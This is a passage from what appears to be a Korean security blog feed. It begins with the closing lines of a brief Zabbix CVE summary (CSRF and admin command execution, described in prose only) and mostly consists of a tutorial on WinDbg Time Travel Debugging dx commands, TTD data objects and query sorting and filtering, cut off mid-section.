&#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC758; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xD574; LDAP &#xC11C;&#xBC84;&#xC5D0;&#xC11C; CSRF &#xACF5;&#xACA9;&#xC774; &#xC131;&#xACF5;&#xD588;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAD00;&#xB9AC;&#xC790;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC2DC; Zabbix&#xC5D0; &#xB0B4;&#xC7A5;&#xB41C; &#xAE30;&#xB2A5;&#xC744; &#xD1B5;&#xD574; Zabbix &#xC11C;&#xBC84;, Zabbix &#xC11C;&#xBC84; &#xD504;&#xB85D;&#xC2DC;, Zabbix agent&#xC5D0;&#xC11C; command execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>csrf</tag>
      
      <tag>zabbix</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 시간을 여행하는 해커를 위한 안내서 Part3</title>
    <link href="/2021/03/14/fabu1ous/ttd-3/"/>
    <url>/2021/03/14/fabu1ous/ttd-3/</url>
    
    <content type="html"><![CDATA[<h1 id="Part-III"><a href="#Part-III" class="headerlink" title="Part III"></a>Part III</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/1.png" alt></p><p>&#xBC8C;&#xC368; Part 3&#xC785;&#xB2C8;&#xB2E4;. 3&#xC8FC;&#xB9C8;&#xB2E4; &#xC2DC;&#xB9AC;&#xC988; &#xAE00; &#xD558;&#xB098;&#xC529; &#xBE14;&#xB85C;&#xADF8;&#xC5D0; &#xC62C;&#xB9AC;&#xACE0; &#xC788;&#xB294;&#xB370; 3&#xC8FC;&#xAC00; &#xC65C; &#xC774;&#xB807;&#xAC8C; &#xBE68;&#xB9AC; &#xC9C0;&#xB098;&#xAC08;&#xAE4C;&#xC694;. &#xC544;&#xB9C8; &#xAC1C;&#xAC15;&#xB3C4; &#xD558;&#xACE0; &#xBC14;&#xBE60;&#xC9C0;&#xB2C8; &#xC2DC;&#xAC04;&#xC774; &#xCC38; &#xBE60;&#xB974;&#xAC8C; &#xD758;&#xB7EC;&#xAC00;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xB290;&#xAEF4;&#xC9C0;&#xB098; &#xBD05;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; Part 3&#xC5D0;&#xC11C;&#xB294; <code>dx</code> &#xBA85;&#xB839;&#xC5B4;&#xC640; TTD data object&#xC758; &#xC0AC;&#xC6A9;&#xBC95;&#xC744; &#xC815;&#xB9AC;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. Part 2&#xB97C; &#xC77D;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC774;&#xB77C;&#xBA74; &#xC774;&#xAC8C; &#xBB34;&#xC5C7;&#xC744; &#xB73B;&#xD558;&#xB294;&#xC9C0; &#xC544;&#xC2DC;&#xACA0;&#xC8E0;? &#xB124;, &#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; <s>&#xC548; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;</s> &#xBABB;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Apex Legends &#xAFC0;&#xC7BC; &#x314E;&#x314E;;; &#xC0AC;&#xC2E4; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xD558;&#xAE34; &#xD588;&#xB294;&#xB370; &#xB9C9;&#xC0C1; &#x201C;TTD&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0; &#xAFC0;&#xD301;!&#x201D;&#xC774;&#xB77C;&#xB294; &#xC8FC;&#xC81C;&#xB85C; &#xD558;&#xB098;&#xC758; &#xAE00;&#xC744; &#xC4F0;&#xAE30;&#xC5D4; &#xC5C4;&#xCCAD; &#xC560;&#xB9E4;&#xD558;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xC774;&#xBBF8; &#xC774;&#xC804; &#xD30C;&#xD2B8;&#xB4E4;&#xC5D0;&#xC11C; &#xC791;&#xC131;&#xD55C; &#xB0B4;&#xC6A9;&#xB4E4;&#xC774; &#xB300;&#xBD80;&#xBD84;&#xC774;&#xACE0; &#xBA87;&#xBA87; &#xC0C1;&#xD669;&#xB4E4;&#xC740; &#xAE00;&#xB85C; &#xD615;&#xC6A9;&#xD558;&#xAE30;&#xC5D4; &#xC800;&#xC758; &#xAE00;&#xBE68;&#xC774; &#xB538;&#xB9AC;&#xACE0;&#x2026;</p><p><img src="/2021/03/14/fabu1ous/ttd-3/both.png" alt></p><p>&#xADF8;&#xB798;&#xC11C; Part 2 &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xC608;&#xACE0;&#xD588;&#xB358; &#xB450; &#xAC00;&#xC9C0; &#xAE00; &#xC8FC;&#xC81C;&#xB97C; Part 3&#xC5D0; &#xBAB0;&#xC544; &#xC4F0;&#xAE30;&#xB85C; &#xACB0;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="&#xC2DC;&#xAC04;&#xC744;-&#xC5EC;&#xD589;&#xD558;&#xB294;-&#xD574;&#xCEE4;&#xB97C;-&#xC704;&#xD55C;-&#xC548;&#xB0B4;&#xC11C;-&#xC774;&#xC804;-&#xAE00;"><a href="#&#xC2DC;&#xAC04;&#xC744;-&#xC5EC;&#xD589;&#xD558;&#xB294;-&#xD574;&#xCEE4;&#xB97C;-&#xC704;&#xD55C;-&#xC548;&#xB0B4;&#xC11C;-&#xC774;&#xC804;-&#xAE00;" class="headerlink" title="&#xC2DC;&#xAC04;&#xC744; &#xC5EC;&#xD589;&#xD558;&#xB294; &#xD574;&#xCEE4;&#xB97C; &#xC704;&#xD55C; &#xC548;&#xB0B4;&#xC11C; &#xC774;&#xC804; &#xAE00;"></a>&#xC2DC;&#xAC04;&#xC744; &#xC5EC;&#xD589;&#xD558;&#xB294; &#xD574;&#xCEE4;&#xB97C; &#xC704;&#xD55C; &#xC548;&#xB0B4;&#xC11C; &#xC774;&#xC804; &#xAE00;</h2><ol><li><a href="https://hackyboiz.github.io/2021/01/24/fabu1ous/ttd-1/">Part1</a></li><li><a href="https://hackyboiz.github.io/2021/02/21/fabu1ous/ttd-2/">Part2</a></li></ol><h1 id="Time-Travel-Debugging-objects"><a href="#Time-Travel-Debugging-objects" class="headerlink" title="Time Travel Debugging objects"></a>Time Travel Debugging objects</h1><p>&#xC774;&#xBC88; Part 3&#xC5D0;&#xC120; TTD data model object&#xC640; Trace File&#xB85C;&#xBD80;&#xD130; TTD data model object&#xB97C; Query &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCFC; &#xAC81;&#xB2C8;&#xB2E4;. TTD Trace File &#xC0AC;&#xC6A9; &#xC2DC; &#xC790;&#xB3D9;&#xC73C;&#xB85C; Process Object&#xC640; Session Object&#xC5D0; &#xB370;&#xC774;&#xD130;&#xAC00; &#xB85C;&#xB4DC;&#xB418;&#xBA70; <code>dx</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xADF8; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="dx-&#xBA85;&#xB839;&#xC5B4;"><a href="#dx-&#xBA85;&#xB839;&#xC5B4;" class="headerlink" title="dx &#xBA85;&#xB839;&#xC5B4;"></a>dx &#xBA85;&#xB839;&#xC5B4;</h1><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx Debugger</code></pre><p><img src="/2021/03/14/fabu1ous/ttd-3/3.png" alt></p><p><code>dx</code>&#xB294; Debugger Object Model Expression&#xC744; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xC81C;&#xAC00; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xB2A5; &#xC704;&#xC8FC;&#xB85C;(&#xB531; &#xC774; &#xAE00;&#xC744; &#xC77D;&#xB294;&#xB370; &#xD544;&#xC694;&#xD55C; &#xAC83;&#xB4E4;&#xB9CC;) &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>dx</code> &#xBA85;&#xB839;&#xC5B4;&#xC5D0; &#xB300;&#xD574; &#xCD94;&#xAC00;&#xB85C; &#xB354; &#xC54C;&#xC544;&#xBCF4;&#xACE0; &#xC2F6;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; <a href="[](">ms docs dx</a>)&#xB97C; &#xC77D;&#xC5B4;&#xBCF4;&#xC2DC;&#xAE38; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;.</p><p>&#xC6B0;&#xC120; <code>dx</code> &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;. &#xC774;&#xBC88; Part 3&#xC5D0;&#xC11C; &#xC55E;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD560; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB4E4;&#xC740; <code>-g</code>&#xC640; <code>-r#</code>&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>-g</p><p>&#xB370;&#xC774;&#xD130;&#xB97C; &#xADF8;&#xB9AC;&#xB4DC;&#xB85C; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. &#xC8FC;&#xB85C; Heap Object&#xB098; Module Object &#xB4F1;&#xC744; &#xD655;&#xC778;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>-r#</p><p>&#xCD5C;&#xB300; <code>#</code> &#xB808;&#xBCA8;&#xAE4C;&#xC9C0; &#xD558;&#xC704; &#xD544;&#xB4DC;&#xB97C; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. &#xC0DD;&#xB7B5;&#xD558;&#xBA74; <code>-r1</code>&#xC774; &#xAE30;&#xBCF8;&#xAC12;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p></li></ul><h2 id="&#xC0AC;&#xC6A9;-&#xC608;&#xC2DC;"><a href="#&#xC0AC;&#xC6A9;-&#xC608;&#xC2DC;" class="headerlink" title="&#xC0AC;&#xC6A9; &#xC608;&#xC2DC;"></a>&#xC0AC;&#xC6A9; &#xC608;&#xC2DC;</h2><ul><li>call stack &#xCD9C;&#xB825;</li></ul><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx -r1 Debugger.Sessions.First().Processes.First().Threads.First().Stack.Frames</code></pre><p><img src="/2021/03/14/fabu1ous/ttd-3/4.png" alt></p><p>dx&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xB514;&#xBC84;&#xAE45; &#xC138;&#xC158;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xC4F0;&#xB808;&#xB4DC;&#xC758; call stack&#xC744; <code>-r1</code>&#xC758; &#xC7AC;&#xADC0; &#xB808;&#xBCA8;&#xB85C; &#xCD9C;&#xB825;&#xD55C; &#xBAA8;&#xC2B5;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li>&#xB85C;&#xB4DC;&#xB41C; &#xBAA8;&#xB4C8; &#xB9AC;&#xC2A4;&#xD2B8; &#xCD9C;&#xB825;</li></ul><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">000</span> &gt; dx -g @$curprocess.Modules</code></pre><p><img src="/2021/03/14/fabu1ous/ttd-3/5.png" alt></p><p>Trace &#xC804;&#xCCB4;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xD558;&#xB294; Module&#xB4E4;&#xC744; grid &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xCD9C;&#xB825;&#xD55C; &#xBAA8;&#xC2B5;&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="Process-Object"><a href="#Process-Object" class="headerlink" title="Process Object"></a>Process Object</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/6.png" alt></p><p>dx &#xBA85;&#xB839;&#xC5B4;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBD24;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xBCF8;&#xACA9; &#xC801;&#xC73C;&#xB85C; TTD data model object&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;. &#xAE00; &#xCD08;&#xBC18; &#xBD80;&#xC5D0; &#xC5B8;&#xAE09;&#xD588;&#xB4EF;&#xC774; TTD&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC790;&#xB3D9;&#xC73C;&#xB85C; Process object&#xC640; Session object&#xC5D0; &#xB370;&#xC774;&#xD130; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;&#xACE0; &#xD588;&#xC5C8;&#xC8E0;? &#xADF8;&#xC911; Process Object&#xC785;&#xB2C8;&#xB2E4;.  <code>@$curprocess.TTD</code> namespace&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>Lifetime</p><p><img src="/2021/03/14/fabu1ous/ttd-3/7.png" alt></p><p>TTD range object&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC804;&#xCCB4; Trace File&#xC758; &#xBC94;&#xC704;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. MinPosition&#xC740; Trace File&#xC758; &#xC2DC;&#xC791; &#xC2DC;&#xC810;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; TTD Position&#xC744;, MaxPosition&#xC740; Trace File&#xC758; &#xC885;&#xB8CC; &#xC2DC;&#xC810;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; TTD Position&#xC744; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>Threads</p><p><img src="/2021/03/14/fabu1ous/ttd-3/8.png" alt></p><p>TTD thread object&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC804;&#xCCB4; Trace File&#xC758; Lifetime&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xC4F0;&#xB808;&#xB4DC;&#xB4E4;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>Events</p><p><img src="/2021/03/14/fabu1ous/ttd-3/9.png" alt></p><p>TTD event object&#xB4E4;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD9C;&#xB825; &#xC2DC; Trace File &#xC804;&#xCCB4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xC5EC;&#xB7EC; &#xC774;&#xBCA4;&#xD2B8;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xBA74; Module&#xC758; &#xB85C;&#xB4DC; &#xC2DC;&#xC810;&#xC774;&#xB77C;&#xB358;&#xAC00; Exception &#xBC1C;&#xC0DD; &#xC2DC;&#xC810;&#xC774;&#xB77C;&#xB358;&#xAC00;. Part 2&#xC5D0;&#xC120; &#xC774; Event object&#xB97C; &#xC0AC;&#xC6A9;&#xD574; Exception &#xC704;&#xCE58;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0;, &#xB514;&#xBC84;&#xAE45;&#xC758; &#xC2DC;&#xC791; &#xC704;&#xCE58;&#xB97C; &#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD588;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><h1 id="Session-Object"><a href="#Session-Object" class="headerlink" title="Session Object"></a>Session Object</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/10.png" alt></p><p>&#xC774;&#xBC88;&#xC5D4; Session Object&#xC785;&#xB2C8;&#xB2E4;. <code>@$cursession.TTD</code> namespace&#xB97C; &#xD1B5;&#xD574; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>Data.Heap()</p><p><img src="/2021/03/14/fabu1ous/ttd-3/11.png" alt></p><p>Trace File &#xC804;&#xCCB4;&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; Heap object&#xB4E4;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>Data.Heap()</code> &#xBA54;&#xC18C;&#xB4DC;&#xC640; grid &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCD9C;&#xB825;&#xD574;&#xC904; &#xC8FC;&#xC18C;, &#xC0AC;&#xC774;&#xC988;, &#xD560;&#xB2F9; &#xC2DC;&#xC810;, &#xD574;&#xC81C; &#xC2DC;&#xC810;&#xC744; &#xD55C;&#xB208;&#xC5D0; &#xBCFC; &#xC218; &#xC788;&#xC5B4; &#xB418;&#xAC8C; &#xD3B8;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xCD5C;&#xADFC;&#xC5D0; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xD558;&#xBA74;&#xC11C; &#xD799; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB85C; &#xC758;&#xC2EC;&#xB418;&#xB294; &#xBC84;&#xADF8;&#xB97C; &#xBD84;&#xC11D; &#xC911;&#xC778;&#xB370; &#xC774; <code>Data.Heap()</code> object&#xB97C; &#xC815;&#xB9D0; &#xC720;&#xC6A9;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>Calls()</p><p><img src="/2021/03/14/fabu1ous/ttd-3/12.png" alt></p><p>&#xD2B9;&#xC815; &#xD568;&#xC218;&#xC758; &#xD638;&#xCD9C;&#xC5D0; &#xB300;&#xD55C; &#xC5EC;&#xB7EC; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; calls object&#xC785;&#xB2C8;&#xB2E4;. <code>Calls()</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xD638;&#xCD9C; &#xD69F;&#xC218;, &#xD638;&#xCD9C; &#xC2DC;&#xC810;, &#xB9AC;&#xD134; &#xC2DC;&#xC810;, &#xB9AC;&#xD134; &#xAC12; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. breakpoint&#xC758; &#xC0C1;&#xC704; &#xD638;&#xD658;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xACE0; &#xC788;&#xB2E4;&#xBA74; Calls query&#xB97C; TimeStart&#xAC12;&#xC73C;&#xB85C; &#xC815;&#xB82C;&#xD55C; &#xD6C4; &#xB9E8; &#xB9C8;&#xC9C0;&#xB9C9; &#xB370;&#xC774;&#xD130; &#xD639;&#xC740; crash &#xBC1C;&#xC0DD; &#xC2DC;&#xC810;&#xACFC; &#xAC00;&#xC7A5; &#xAC00;&#xAE4C;&#xC6B4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC120;&#xD0DD;&#xD574; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC815;&#xD655;&#xD55C; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xC27D;&#xAC8C;&#xB3C4; Calls() &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB824;&#xBA74; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xC2EC;&#xBCFC;&#xC774; &#xC0B4;&#xC544; &#xC788;&#xC5B4;&#xC57C; &#xD574;&#xC11C; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>Memory()</p><p><img src="/2021/03/14/fabu1ous/ttd-3/13.png" alt></p><p>Memory object&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD2B9;&#xC815; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xBC1C;&#xC0DD;&#xD55C; &#xBAA8;&#xB4E0; &#xC811;&#xADFC;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xC815; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xC811;&#xADFC;&#xD55C; &#xC2DC;&#xC810;, &#xC811;&#xADFC; &#xD0C0;&#xC785;, &#xB2F9;&#xC2DC; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xCE74;&#xC6B4;&#xD130;&#xC758; &#xC0C1;&#xD669; &#xB4F1;&#xC744; &#xD568;&#xAED8; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. ba &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC0C1;&#xC704; &#xD638;&#xD658;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC11C; Part 2&#xC5D0;&#xC11C; EBP&#xAC00; &#xB36E;&#xC5B4; &#xC4F0;&#xC774;&#xB294; &#xC2DC;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574; ba &#xBA85;&#xB839;&#xC5B4; &#xB300;&#xC2E0; &#xC774; Memory object&#xB97C; &#xC0AC;&#xC6A9;&#xD560;&#xAE4C; &#xACE0;&#xBBFC;&#xD588;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. ba&#xC758; &#xACBD;&#xC6B0;&#xC5D4; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; range&#xB97C; &#xCD5C;&#xB300; 8 bytes&#xAE4C;&#xC9C0; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; TTD Memory object query&#xB294; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><h1 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h1><p>TTD data object&#xB4E4;&#xC758; &#xC885;&#xB958;&#xC640; &#xADF8;&#xC5D0; &#xB9DE;&#xB294; &#xBA54;&#xC18C;&#xB4DC;&#xB4E4;&#xC758; &#xC885;&#xB958;&#xB97C; &#xC54C;&#xC544;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xADF8; &#xBA54;&#xC18C;&#xB4DC;&#xB4E4;&#xC744; &#xD1B5;&#xD574; &#xB9AC;&#xD134; &#xBC1B;&#xC740; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC744; &#xC815;&#xB82C; &#xBC0F; &#xAC00;&#xACF5;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><h2 id="Sorting-Queries"><a href="#Sorting-Queries" class="headerlink" title="Sorting Queries"></a>Sorting Queries</h2><p>OrderBy() &#xD639;&#xC740; OrderByDescending()&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD2B9;&#xC815; column&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC815;&#xB82C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704;&#xC5D0;&#xC11C; Calls() &#xBA54;&#xC18C;&#xB4DC; &#xC774;&#xC57C;&#xAE30;&#xB97C; &#xD558;&#xBA74;&#xC11C; &#xC124;&#xBA85;&#xD588;&#xB358; &#xB0B4;&#xC6A9;&#xC778;&#xB370; crash &#xC2DC;&#xC810;, &#xD639;&#xC740; Trace File&#xC758; &#xC885;&#xB8CC; &#xC2DC;&#xC810;&#xACFC; &#xAC00;&#xC7A5; &#xAC00;&#xAC00;&#xC6B4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC120;&#xD0DD;&#xD558;&#xAE30; &#xC704;&#xD574; TimeStart&#xC640; OrderByDescending()&#xC744; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>OrderBy()</li></ul><pre><code class="hljs c">dx @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).OrderBy(c =&gt; c.TimeStart)</code></pre><p>TimeStart column&#xC73C;&#xB85C; &#xC624;&#xB984; &#xCC28;&#xC21C; &#xC815;&#xB82C;&#xC744; &#xD558;&#xB294; &#xC608;&#xC81C; query&#xC785;&#xB2C8;&#xB2E4;. (&#xC0AC;&#xC2E4; TimeStart&#xB85C; &#xC624;&#xB984; &#xCC28;&#xC21C; &#xC815;&#xB82C;&#xD558;&#xB294; &#xAC74; &#xC758;&#xBBF8;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8; &#xC815;&#xB82C; &#xB418;&#xC5B4; &#xC788;&#xAC70;&#xB4E0;&#xC694;.)</p><ul><li>OrderByDescending()</li></ul><pre><code class="hljs c">dx -r2 @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).OrderByDescending(c =&gt; c.TimeStart)</code></pre><p>TimeStart column&#xC73C;&#xB85C; &#xB0B4;&#xB9BC; &#xCC28;&#xC21C; &#xC815;&#xB82C;&#xC744; &#xD558;&#xB294; &#xC608;&#xC81C; query&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="Specifying-elements-in-query"><a href="#Specifying-elements-in-query" class="headerlink" title="Specifying elements in query"></a>Specifying elements in query</h2><p>query&#xC5D0; append &#xB41C; element&#xB97C; &#xD2B9;&#xC815;&#xC9C0;&#xC5B4;&#xC11C; &#xCD9C;&#xB825;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. First() &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCCAB; &#xBC88;&#xC9F8; element&#xB97C; &#xD2B9;&#xC815; &#xC9D6;&#xAC70;&#xB098; &#xB300;&#xAD04;&#xD638;&#xC640; index number&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC6D0;&#xD558;&#xB294; element&#xB97C; &#xD2B9;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">dx @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).First()dx @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>)[<span class="hljs-number">0x0</span>]</code></pre><h2 id="Filtering-in-a-query"><a href="#Filtering-in-a-query" class="headerlink" title="Filtering in a query"></a>Filtering in a query</h2><p>SQL&#xACFC; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; Where() &#xD639;&#xC740; Select()&#xB97C; &#xC0AC;&#xC6A9;&#xD574; query&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; 